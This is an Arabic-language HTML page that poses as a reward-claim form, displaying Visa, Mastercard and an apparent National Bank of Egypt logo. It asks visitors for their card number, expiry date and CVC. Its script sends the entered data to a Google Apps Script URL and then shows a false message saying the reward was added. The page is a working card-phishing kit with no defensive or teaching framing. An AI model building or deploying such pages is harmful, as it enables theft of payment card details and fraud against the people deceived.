<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>نموذج المكافأة</title>
  <style>
    body { font-family: Arial, sans-serif; padding: 20px; background: #f4f4f4; direction: rtl; }
    .payment-method {
      display: flex;
      gap: 20px;
      margin-bottom: 20px;
    }
    .method {
      border: 2px solid #ccc;
      border-radius: 5px;
      padding: 10px;
      cursor: pointer;
      background: white;
    }
    .selected {
      border-color: #0070ba;
      background: #e6f2ff;
    }
    form {
      max-width: 400px;
      background: white;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 2px 6px rgba(0,0,0,0.1);
    }
    input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      box-sizing: border-box;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #28a745;
      color: white;
      padding: 12px;
      border: none;
      width: 100%;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
    }
    img {
      height: 24px;
      vertical-align: middle;
    }
  </style>
</head>
<body>

<h2>اختر طريقة الاستلام</h2>
<div class="payment-method">
  <div class="method selected" onclick="selectMethod(this)">
    بطاقة ائتمان
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg">
    <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png">
  </div>
  <div class="method" onclick="selectMethod(this)">
    <img src="NBE_logo.png" alt="sim Logo" class="company-logo">
  </div>
</div>

<p>قم بإدخال بيانات بطاقتك الإئتمانية لاستلام مبلغ المكافأة.</p>

<form id="payment-form">
  <input type="text" name="card_number" placeholder="رقم البطاقة" required>
  <input type="text" name="expiry_date" placeholder="MM / YY" required>
  <input type="text" name="cvc" placeholder="CVC" required>
  <button type="submit">استلام المكافأة</button>
</form>

<script>
  function selectMethod(el) {
    document.querySelectorAll('.method').forEach(m => m.classList.remove('selected'));
    el.classList.add('selected');
  }

  document.getElementById('payment-form').addEventListener('submit', async function(e) {
    e.preventDefault();
    const formData = new FormData(e.target);

    await fetch("https://script.google.com/macros/s/AKfycbx3it9kpq42Lp0D-hxH2In7G_dVb_YMsZI73-IBhPtqPt5e8EFlr1LV1Kqh1IjUdd5bIQ/exec", {
      method: "POST",
      body: formData
    });

    alert("تم إضافة مبلغ المكافأة بنجاح!");
    e.target.reset();
  });
</script>

</body>
</html>
